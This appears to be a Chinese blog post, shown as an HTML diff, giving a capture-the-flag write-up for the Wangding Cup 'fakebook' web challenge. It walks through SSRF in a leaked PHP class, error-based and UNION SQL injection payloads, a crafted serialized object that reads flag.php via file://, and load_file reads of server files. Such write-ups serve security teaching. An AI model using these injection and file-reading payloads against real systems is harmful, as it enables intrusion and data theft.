@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>网鼎杯fakebook - LionTree</title>
+  <link rel="icon" href="https://i.imgur.com/SrZt9VU.jpg" type="image/x-icon">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=反序列化,writeup,sql注入,ssrf>
+  
+  
+  
+    <link rel="alternate" href="/atom.xml " title="LionTree" type="application/atom+xml">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">LionTree</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/summary" class="menu-item-link">Summary</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/atom.xml" class="menu-item-link">RSS</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">网鼎杯fakebook</h1>
+  </div>
+
+  <!-- 文章目录 -->
+  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#预期解"><span class="toc-text">预期解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#非预期解"><span class="toc-text">非预期解</span></a></li></ol>
+
+  <div class="post-content">
+    <ul>
+<li>可以扫到robots.txt, login.php, flag.php</li>
+<li>robots.txt 中发现一个user.php.bak,代码如下</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>怀疑博客地址那里可以ssrf</p>
+<h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><ul>
+<li>view.php存在报错注入<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=1 and updatexml(1,concat(1,(<span class="keyword">SELECT</span> <span class="keyword">database</span>())),<span class="number">1</span>) <span class="comment">#</span></span><br></pre></td></tr></table></figure></li>
+<li>可以发现users表中存储了UserInfo类反序列化后的结果</li>
+<li>利用union联合注入使得查询到的语句是我们想要的反序列化值，在博客地址那里构造file协议读取flag.php</li>
+<li>得到反序列化值:<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> UserInfo(<span class="string">'fuck'</span>,<span class="string">'0'</span>,<span class="string">'file:///var/www/html/flag.php'</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li>联合注入<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=0 union<span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">'O:8:"UserInfo":3:&#123;s:4:"name";s:4:"fuck";s:3:"age";i:0;s:4:"blog";s:29:"file:///var/www/html/flag.php";&#125;'</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+查看源代码得到base64编码的flag.php</li>
+</ul>
+<h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><ul>
+<li>直接去读flag.php<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=1 and updatexml(1,concat(1,(<span class="keyword">SELECT</span> <span class="keyword">load_file</span>(<span class="string">'/var/www/html/flag.php'</span>))),<span class="number">1</span>) <span class="comment">#</span></span><br></pre></td></tr></table></figure></li>
+<li>updatexml有长度限制,可以用substring分批读取,即可读到flag<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=1 and updatexml(1,concat(1,(<span class="keyword">SELECT</span> <span class="keyword">substring</span>(<span class="keyword">load_file</span>(<span class="string">'/var/www/html/flag.php'</span>),<span class="number">10</span>,<span class="number">30</span>))),<span class="number">1</span>) <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+
+  </div>
+  <div class="post-meta">
+    <span class="post-time" style="color:#646060;font-size:13px">2019-11-24</span>
+  </div>
+
+  <div class="post-footer">
+    
+      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/ssrf/" rel="tag">ssrf</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li></ul>
+    
+
+    <a href="#top" class="top">Back to Top</a>
+  </div>
+</article>
+
+<!-- 评论插件 -->
+
+<footer>
+  2022
+  <span class="author">
+    LionTree
+  </span>
+</footer>
+
+
+    </div>
+  </body>
+</html>
